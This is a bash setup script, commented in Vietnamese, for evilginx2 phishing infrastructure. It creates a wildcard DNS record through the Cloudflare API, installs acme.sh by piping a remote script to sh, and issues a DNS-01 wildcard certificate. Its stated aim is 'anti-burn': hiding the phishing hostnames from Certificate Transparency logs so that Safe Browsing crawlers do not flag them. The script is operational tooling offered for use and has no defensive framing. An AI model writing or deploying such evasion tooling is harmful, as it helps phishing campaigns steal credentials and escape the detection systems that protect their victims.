#!/usr/bin/env bash
# wildcard-cert-setup.sh — anti-burn cert provisioning cho evilginx2 (fake-evilginx-pro)
#
# Cốt lõi: autocert per-host cert đưa TỪNG hostname vào CT logs → Google Safe Browsing
# crawler flag trong vài giờ. Wildcard qua DNS-01 CHỈ lộ base label (*.BASE.ZONE),
# không bao giờ lộ hostname → crawler không có gì để liệt kê.
#
# Idempotent — chạy lại an toàn. Usage (trên VPS):
#   CF_TOKEN='...' BASE=auth2 ZONE=example.com VPS_IP=1.2.3.4 ./wildcard-cert-setup.sh
set -euo pipefail

BASE="${BASE:?BASE=<label> required, vi du: auth2}"
ZONE="${ZONE:?ZONE=<registered domain> required}"
VPS_IP="${VPS_IP:?VPS_IP=<public ip> required}"
CF_TOKEN="${CF_TOKEN:?CF_TOKEN required (Cloudflare API token, Zone.DNS Edit)}"
RUNTIME_DIR="${RUNTIME_DIR:-$HOME/.evilginx}"
ACME="${ACME:-$HOME/.acme.sh/acme.sh}"

BASE_FQDN="${BASE}.${ZONE}"
WILDCARD="*.${BASE_FQDN}"
SITE_DIR="${RUNTIME_DIR}/crt/sites/wildcard-${BASE}"

echo "=== [1/5] Zone ID + wildcard DNS record (${WILDCARD} -> ${VPS_IP}, DNS-only) ==="
ZONE_ID=$(curl -s -H "Authorization: Bearer $CF_TOKEN" \
  "https://api.cloudflare.com/client/v4/zones?name=${ZONE}" | jq -r '.result[0].id // empty')
[ -n "$ZONE_ID" ] || { echo "FAIL: cannot get zone id — check token scope"; exit 1; }

REC_ID=$(curl -s -H "Authorization: Bearer $CF_TOKEN" \
  "https://api.cloudflare.com/client/v4/zones/${ZONE_ID}/dns_records?type=A&name=*.${BASE}" \
  | jq -r '.result[0].id // empty')
if [ -n "$REC_ID" ]; then
  echo "wildcard A record already exists (${REC_ID}) — skip"
else
  curl -s -H "Authorization: Bearer $CF_TOKEN" -H "Content-Type: application/json" \
    -X POST "https://api.cloudflare.com/client/v4/zones/${ZONE_ID}/dns_records" \
    --data "{\"type\":\"A\",\"name\":\"*.${BASE}\",\"content\":\"${VPS_IP}\",\"ttl\":1,\"proxied\":false}" \
    | jq -e '.success' >/dev/null && echo "wildcard A record created"
fi

echo "=== [2/5] Install acme.sh (if missing) ==="
if [ ! -f "$ACME" ]; then
  curl -s https://get.acme.sh | sh -s "email=admin@${ZONE}"
fi

echo "=== [3/5] Issue wildcard cert via DNS-01: ${WILDCARD} ==="
export CF_Token="$CF_TOKEN" CF_Zone_ID="$ZONE_ID"
"$ACME" --issue --dns dns_cf -d "$WILDCARD" --server letsencrypt

echo "=== [4/5] Install cert into certdb (${SITE_DIR}) + auto reload on renew ==="
mkdir -p "$SITE_DIR"
"$ACME" --install-cert -d "$WILDCARD" \
  --fullchain-file "${SITE_DIR}/fullchain.pem" \
  --key-file     "${SITE_DIR}/privkey.pem" \
  --reloadcmd "${RELOAD_CMD:-true}"
chmod 600 "${SITE_DIR}/privkey.pem"

echo "=== [5/5] autocert OFF (service must be STOPPED while editing config.json) ==="
if systemctl is-active --quiet evilginx2 2>/dev/null; then
  echo "WARNING: evilginx2 service is running — NOT editing config.json. Run this stage with the service stopped, or use setup_evilginx.sh which handles stop/start."
else
  python3 - "$RUNTIME_DIR" <<'PYEOF'
import json, sys, os
runtime = sys.argv[1]
p = os.path.join(runtime, "config.json")
cfg = json.load(open(p)) if os.path.exists(p) else {"general": {}, "phishlets": {}}
cfg.setdefault("general", {})["autocert"] = False
json.dump(cfg, open(p, "w"), indent=2)
print("autocert:", cfg["general"]["autocert"])
PYEOF
fi

echo "DONE. Wildcard cert at: ${SITE_DIR}/{fullchain.pem,privkey.pem}"
echo "CT check (must show ONLY the wildcard, no hostnames): https://crt.sh/?q=${BASE_FQDN}"
